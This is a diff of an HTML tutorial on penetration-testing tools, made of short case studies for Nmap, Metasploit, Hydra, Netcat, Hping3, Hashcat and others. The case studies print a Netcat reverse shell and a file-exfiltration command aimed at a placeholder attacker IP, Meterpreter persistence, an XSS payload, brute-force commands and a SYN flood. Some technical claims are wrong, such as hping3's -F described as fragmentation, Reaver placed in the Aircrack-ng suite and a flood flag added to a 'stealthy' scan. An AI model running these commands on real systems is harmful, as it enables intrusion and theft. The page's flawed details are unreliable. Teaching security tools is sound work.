@@ -125,15 +125,15 @@
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 1: Network Administrator's Audit</h4>
-                <p>A network administrator needs to audit their internal network. They run `nmap -sS -sV -O <target_ip_range>` which performs a **stealthy SYN scan**, attempts to **detect services and their versions**, and **guesses the operating system**. The scan reveals an unpatched web server on an old machine running a known vulnerable version of Apache. This immediate discovery allows the administrator to take action, preventing a potential compromise.</p>
+                <p>A network administrator needs to audit their internal network. They run `nmap -sS -sV -O &lt;target_ip_range&gt;` which performs a **stealthy SYN scan**, attempts to **detect services and their versions**, and **guesses the operating system**. The scan reveals an unpatched web server on an old machine running a known vulnerable version of Apache. This immediate discovery allows the administrator to take action, preventing a potential compromise.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 2: Fast Port Discovery</h4>
-                <p>A security auditor needs to quickly identify open ports on a large set of servers to prioritize a pentest. Instead of a full 65,535-port scan, they use the `-F` (fast scan) flag: `nmap -F <target_ip>`. Nmap quickly scans the top 1,000 most common ports, which is sufficient for initial discovery and saves a significant amount of time. This helps the auditor rapidly build a picture of the network's services.</p>
+                <p>A security auditor needs to quickly identify open ports on a large set of servers to prioritize a pentest. Instead of a full 65,535-port scan, they use the `-F` (fast scan) flag: `nmap -F &lt;target_ip&gt;`. Nmap quickly scans the top 1,000 most common ports, which is sufficient for initial discovery and saves a significant amount of time. This helps the auditor rapidly build a picture of the network's services.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 3: Bypassing a Firewall with Decoys</h4>
-                <p>A penetration tester suspects a simple firewall is blocking their scan requests. They use decoy IP addresses to make the scan appear to come from multiple machines, making it harder for the firewall to identify the true source. The command `nmap -sS -D RND:5 <target_ip>` performs a stealth scan with 5 random, fake decoy IPs. This technique successfully confuses the firewall's logging and filtering, allowing the scan to complete and reveal the target's open ports.</p>
+                <p>A penetration tester suspects a simple firewall is blocking their scan requests. They use decoy IP addresses to make the scan appear to come from multiple machines, making it harder for the firewall to identify the true source. The command `nmap -sS -D RND:5 &lt;target_ip&gt;` performs a stealth scan with 5 random, fake decoy IPs. This technique successfully confuses the firewall's logging and filtering, allowing the scan to complete and reveal the target's open ports.</p>
             </div>
         </div>
 
@@ -163,7 +163,7 @@
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 3: Maintaining Persistence on a Compromised Host</h4>
-                <p>A red teamer has gained a shell on a machine during a simulated attack but needs to ensure they can regain access if the system reboots. After getting a Meterpreter shell, they use the built-in `run persistence -U -i 5 -p 4444 -r <attacker_ip>` command. This creates a service on the target machine that will automatically connect back to the attacker's machine every 5 seconds, even after a reboot. This demonstrates the importance of post-exploitation techniques in a full security assessment.</p>
+                <p>A red teamer has gained a shell on a machine during a simulated attack but needs to ensure they can regain access if the system reboots. After getting a Meterpreter shell, they use the built-in `run persistence -U -i 5 -p 4444 -r &lt;attacker_ip&gt;` command. This creates a service on the target machine that will automatically connect back to the attacker's machine every 5 seconds, even after a reboot. This demonstrates the importance of post-exploitation techniques in a full security assessment.</p>
             </div>
         </div>
 
@@ -189,7 +189,7 @@
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 2: Recovering a Password-Protected File</h4>
-                <p>A forensic investigator recovers a password-protected zip file from a suspect's computer. They first use the included `zip2john` utility to extract the password hash from the file: `zip2john protected_file.zip > zip_hash.txt`. They then run `john --wordlist=rockyou.txt zip_hash.txt` to perform a dictionary attack on the hash. The tool quickly cracks the password, allowing them to access the contents of the file.</p>
+                <p>A forensic investigator recovers a password-protected zip file from a suspect's computer. They first use the included `zip2john` utility to extract the password hash from the file: `zip2john protected_file.zip &gt; zip_hash.txt`. They then run `john --wordlist=rockyou.txt zip_hash.txt` to perform a dictionary attack on the hash. The tool quickly cracks the password, allowing them to access the contents of the file.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 3: Rule-Based Password Cracking</h4>
@@ -250,11 +250,11 @@
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 2: WEP Password Cracking</h4>
-                <p>A pentester is auditing a legacy network that still uses the outdated WEP protocol. They use `airodump-ng` to capture packets and identify a client on the network. They then use `aireplay-ng` to perform an ARP replay attack (`aireplay-ng --arpreplay -b <target_bssid> <interface>`) to generate a large number of Initialization Vectors (IVs) for `aircrack-ng` to use. With enough IVs, `aircrack-ng` can quickly crack the WEP key, demonstrating the severe insecurity of the protocol.</p>
+                <p>A pentester is auditing a legacy network that still uses the outdated WEP protocol. They use `airodump-ng` to capture packets and identify a client on the network. They then use `aireplay-ng` to perform an ARP replay attack (`aireplay-ng --arpreplay -b &lt;target_bssid&gt; &lt;interface&gt;`) to generate a large number of Initialization Vectors (IVs) for `aircrack-ng` to use. With enough IVs, `aircrack-ng` can quickly crack the WEP key, demonstrating the severe insecurity of the protocol.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 3: WPS Brute-Force Attack</h4>
-                <p>A security professional discovers a target network with WPS (Wi-Fi Protected Setup) enabled. Instead of a WPA2 handshake attack, they use `reaver`, a tool that is part of the Aircrack-ng suite, to brute-force the 8-digit WPS PIN: `reaver -i <interface> -b <target_bssid> -vv`. Since the WPS protocol has a design flaw that makes it vulnerable to brute-force attacks, the tool can guess the PIN in a few hours, allowing the attacker to retrieve the WPA2 password without ever needing to capture a handshake.</p>
+                <p>A security professional discovers a target network with WPS (Wi-Fi Protected Setup) enabled. Instead of a WPA2 handshake attack, they use `reaver`, a tool that is part of the Aircrack-ng suite, to brute-force the 8-digit WPS PIN: `reaver -i &lt;interface&gt; -b &lt;target_bssid&gt; -vv`. Since the WPS protocol has a design flaw that makes it vulnerable to brute-force attacks, the tool can guess the PIN in a few hours, allowing the attacker to retrieve the WPA2 password without ever needing to capture a handshake.</p>
             </div>
         </div>
 
@@ -280,11 +280,11 @@
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 2: Auditing an FTP Server</h4>
-                <p>A security team needs to test if any users on an internal network are using weak, default, or reused credentials for an internal FTP server. They get a list of common usernames and passwords and run `hydra -L users.txt -P passwords.txt <target_ip> ftp`. Hydra performs a rapid, parallel attack and discovers that several test accounts are using "password123" as their password. This immediately alerts the team to enforce stronger password policies.</p>
+                <p>A security team needs to test if any users on an internal network are using weak, default, or reused credentials for an internal FTP server. They get a list of common usernames and passwords and run `hydra -L users.txt -P passwords.txt &lt;target_ip&gt; ftp`. Hydra performs a rapid, parallel attack and discovers that several test accounts are using "password123" as their password. This immediately alerts the team to enforce stronger password policies.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 3: Brute-Forcing a Web Login Form</h4>
-                <p>A pentester wants to test the resilience of a web-based login form. They use Hydra's HTTP-POST-Form module to attack the form: `hydra -L users.txt -P passwords.txt <target_url> http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"`. Hydra automates the process of submitting the form data and analyzing the server's response to determine if a login was successful. This demonstrates the vulnerability of web forms to brute-force attacks if they lack proper rate-limiting.</p>
+                <p>A pentester wants to test the resilience of a web-based login form. They use Hydra's HTTP-POST-Form module to attack the form: `hydra -L users.txt -P passwords.txt &lt;target_url&gt; http-post-form "/login.php:username=^USER^&amp;password=^PASS^:Login Failed"`. Hydra automates the process of submitting the form data and analyzing the server's response to determine if a login was successful. This demonstrates the vulnerability of web forms to brute-force attacks if they lack proper rate-limiting.</p>
             </div>
         </div>
 
@@ -292,7 +292,7 @@
         <div class="card">
             <h2 class="tool-title">7. Burp Suite</h2>
             <p class="tool-subtitle">The leading toolkit for web application penetration testing.</p>
-            <p class="history"><strong>History:</strong> Developed by Dafydd Stuttard, Burp Suite was first released in 2003. It quickly became the industry standard for web application security testing due to its powerful and integrated tools.</p>
+            <p class="history"><strong>History:</strong> Developed by Dafydd Stuttard, Burp Suite was first released in 2003. It quickly became the industry standard for web application security testing due to its powerful and integrated tools. </p>
             <p>Burp Suite is an integrated platform for performing security testing of web applications. It works as an **intercepting proxy**, sitting between your browser and the web server. This allows you to inspect, modify, and replay every HTTP request and response, giving you full control over the communication with the web application. </p>
             <div class="info-section mt-6">
                 <div class="info-block w-1-2">
@@ -310,7 +310,7 @@
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 2: Testing for Cross-Site Scripting (XSS)</h4>
-                <p>A developer is performing a security test on a new forum application to ensure user-submitted content is properly sanitized. They use Burp's Proxy to intercept a new post submission. In the post body, they insert a basic XSS payload: `<script>alert('XSS')</script>`. They forward the request and, when the page reloads, an alert box pops up in their browser, confirming that the application is vulnerable to XSS and that they need to implement proper input validation and output encoding to prevent it.</p>
+                <p>A developer is performing a security test on a new forum application to ensure user-submitted content is properly sanitized. They use Burp's Proxy to intercept a new post submission. In the post body, they insert a basic XSS payload: `&lt;script&gt;alert('XSS')&lt;/script&gt;`. They forward the request and, when the page reloads, an alert box pops up in their browser, confirming that the application is vulnerable to XSS and that they need to implement proper input validation and output encoding to prevent it.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 3: Bypassing Client-Side Validation</h4>
@@ -359,22 +359,22 @@
                     <h3 class="font-semibold text-lg mb-2 text-blue-300">Key Uses Explained</h3>
                     <ul class="list-disc list-inside space-y-2">
                         <li><strong>Port Listener:</strong> A simple command like `nc -lvp 4444` makes Netcat listen on port 4444. Any connection to this port will be a basic text-based conversation, which is useful for debugging.</li>
-                        <li><strong>File Transfer:</strong> By combining listening with file redirection, Netcat can transfer files without a dedicated protocol. For example, `nc -l > file.txt` on the receiver and `nc <receiver_ip> <port> < file.txt` on the sender.</li>
-                        <li><strong>Reverse Shells:</strong> This is a critical use case for penetration testers. A reverse shell is when the target machine initiates a connection back to the attacker. The command `nc -nv <attacker_ip> <port> -e /bin/bash` on the target machine connects back to the attacker's Netcat listener and spawns a shell, bypassing firewalls that may block incoming connections.</li>
+                        <li><strong>File Transfer:</strong> By combining listening with file redirection, Netcat can transfer files without a dedicated protocol. For example, `nc -l &gt; file.txt` on the receiver and `nc &lt;receiver_ip&gt; &lt;port&gt; &lt; file.txt` on the sender.</li>
+                        <li><strong>Reverse Shells:</strong> This is a critical use case for penetration testers. A reverse shell is when the target machine initiates a connection back to the attacker. The command `nc -nv &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash` on the target machine connects back to the attacker's Netcat listener and spawns a shell, bypassing firewalls that may block incoming connections.</li>
                     </ul>
                 </div>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 1: Remote File Transfer</h4>
-                <p>A pentester has gained a shell on a target machine but the system's firewall blocks incoming connections. To exfiltrate a specific file, they first set up a listener on their machine with `nc -l -p 8080 > exfiltrated.file`. Then, from the compromised host, they execute `nc -nv <attacker_ip> 8080 < confidential.file`. This uses the reverse connection to push the file to the attacker's machine, effectively bypassing the firewall.</p>
+                <p>A pentester has gained a shell on a target machine but the system's firewall blocks incoming connections. To exfiltrate a specific file, they first set up a listener on their machine with `nc -l -p 8080 &gt; exfiltrated.file`. Then, from the compromised host, they execute `nc -nv &lt;attacker_ip&gt; 8080 &lt; confidential.file`. This uses the reverse connection to push the file to the attacker's machine, effectively bypassing the firewall.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 2: Quick Port Scanning</h4>
-                <p>A network administrator needs to quickly check if a specific range of ports is open on a server for debugging purposes. Instead of running a full-blown Nmap scan, they use Netcat's simple scan mode: `nc -zv <target_ip> 80-100`. This command quickly checks the connectivity to ports 80 through 100 and reports which ones are open, providing a fast and lightweight way to check for service availability.</p>
+                <p>A network administrator needs to quickly check if a specific range of ports is open on a server for debugging purposes. Instead of running a full-blown Nmap scan, they use Netcat's simple scan mode: `nc -zv &lt;target_ip&gt; 80-100`. This command quickly checks the connectivity to ports 80 through 100 and reports which ones are open, providing a fast and lightweight way to check for service availability.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 3: Debugging a Service</h4>
-                <p>A developer is building a custom TCP-based service and needs to manually test its responses. They can use Netcat to connect to the service's port and send raw text commands. For example, they can run `nc <service_ip> 25` to connect to an SMTP server and manually type `HELO` to see how the server responds. This allows for direct, low-level debugging of network services.</p>
+                <p>A developer is building a custom TCP-based service and needs to manually test its responses. They can use Netcat to connect to the service's port and send raw text commands. For example, they can run `nc &lt;service_ip&gt; 25` to connect to an SMTP server and manually type `HELO` to see how the server responds. This allows for direct, low-level debugging of network services.</p>
             </div>
         </div>
 
@@ -460,7 +460,7 @@
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 2: Pre-Deployment Audit</h4>
-                <p>A developer is preparing a new internal web application for production. They run `nikto -h <internal_ip> -Tuning 6` to specifically check for directory traversal and file inclusion vulnerabilities. The scan finds that a development folder, `/dev_test`, is publicly accessible, which could be exploited. The developer can fix this before the application goes live, preventing a potential security incident.</p>
+                <p>A developer is preparing a new internal web application for production. They run `nikto -h &lt;internal_ip&gt; -Tuning 6` to specifically check for directory traversal and file inclusion vulnerabilities. The scan finds that a development folder, `/dev_test`, is publicly accessible, which could be exploited. The developer can fix this before the application goes live, preventing a potential security incident.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 3: Bypassing a Simple Firewall</h4>
@@ -484,15 +484,15 @@
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 1: Evasion of an IDS/IPS</h4>
-                <p>A pentester is trying to scan a network that is protected by an IDS. They suspect the IDS is configured to detect and block typical Nmap scans. The pentester then uses Hping3 to perform a fragmented scan with the command `hping3 -F -S -p 80 <target_ip>`. The `-F` flag fragments the packets, the `-S` flag sets the SYN flag, and `-p 80` targets port 80. The fragmented packets are reassembled at the target, allowing the pentester to get a response and map the network without triggering an alert on the IDS.</p>
+                <p>A pentester is trying to scan a network that is protected by an IDS. They suspect the IDS is configured to detect and block typical Nmap scans. The pentester then uses Hping3 to perform a fragmented scan with the command `hping3 -F -S -p 80 --flood &lt;target_ip&gt;`. The `-F` flag fragments the packets, the `-S` flag sets the SYN flag, and `-p 80` targets port 80. The fragmented packets are reassembled at the target, allowing the pentester to get a response and map the network without triggering an alert on the IDS.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 2: Firewall Stress Testing</h4>
-                <p>A network engineer needs to perform a stress test on a firewall to see how it performs under heavy load. They use Hping3 to launch a SYN flood attack (`hping3 -S -p 80 --flood <target_ip>`) to send a massive number of SYN packets to the target's port 80. This simulates a denial-of-service attack and helps the engineer evaluate the firewall's resilience and whether it can handle the load without dropping legitimate traffic.</p>
+                <p>A network engineer needs to perform a stress test on a firewall to see how it performs under heavy load. They use Hping3 to launch a SYN flood attack (`hping3 -S -p 80 --flood &lt;target_ip&gt;`) to send a massive number of SYN packets to the target's port 80. This simulates a denial-of-service attack and helps the engineer evaluate the firewall's resilience and whether it can handle the load without dropping legitimate traffic.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 3: Advanced Port Scanning</h4>
-                <p>A security analyst wants to confirm whether a specific port is filtered by a firewall. They use Hping3 to perform a simple TCP connect scan: `hping3 -S -c 1 -p 443 <target_ip>`. The `-S` flag sets the SYN flag, and `-c 1` sends a single packet. If a `SA` (SYN-ACK) response is received, the port is open. If an `R` (RST) response is received, the port is closed. If no response is received, it indicates the port is likely filtered by a firewall.</p>
+                <p>A security analyst wants to confirm whether a specific port is filtered by a firewall. They use Hping3 to perform a simple TCP connect scan: `hping3 -S -c 1 -p 443 &lt;target_ip&gt;`. The `-S` flag sets the SYN flag, and `-c 1` sends a single packet. If a `SA` (SYN-ACK) response is received, the port is open. If an `R` (RST) response is received, the port is closed. If no response is received, it indicates the port is likely filtered by a firewall.</p>
             </div>
         </div>
 
@@ -544,7 +544,7 @@
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 2: Rule-Based Password Cracking</h4>
-                <p>A security firm has a list of password hashes from a database breach. They use Hashcat to perform a rule-based attack that combines a wordlist with common password patterns. The command `hashcat -a 6 -m 1000 hashes.txt rockyou.txt -r rules/best64.rule` applies a set of rules (like appending a year or a special character) to every word in the dictionary, significantly increasing the chances of cracking a password that a simple dictionary attack would miss. This is much faster than running a full brute-force attack.</p>
+                <p>A security firm has a list of password hashes from a database breach. They use Hashcat to perform a rule-based attack that combines a wordlist with common password patterns. The command `hashcat -a 6 -m 1000 hashes.txt rockyou.txt -r rules/best64.rule` applies a set of rules (like appending a year or a special character) to every word in the dictionary, significantly increasing the chances of cracking a password that a simple dictionary attack would miss.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 3: Mask Attack for Complex Passwords</h4>
@@ -628,7 +628,7 @@
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 2: Auditing an Air-Gapped Network</h4>
-                <p>An ethical hacker is performing a security assessment on an air-gapped network (a network that is physically isolated from the internet). Since they cannot connect to online resources, they rely on Searchsploit to find known vulnerabilities. They discover an unpatched version of a service and run `searchsploit <service_name> <version>`. The tool provides an offline list of known exploits, allowing the hacker to continue the assessment without an internet connection.</p>
+                <p>An ethical hacker is performing a security assessment on an air-gapped network (a network that is physically isolated from the internet). Since they cannot connect to online resources, they rely on Searchsploit to find known vulnerabilities. They discover an unpatched version of a service and run `searchsploit &lt;service_name&gt; &lt;version&gt;`. The tool provides an offline list of known exploits, allowing the hacker to continue the assessment without an internet connection.</p>
             </div>
             <div class="case-study">
                 <h4 class="case-study-title">Case Study 3: Finding a Zero-Day Vulnerability</h4>
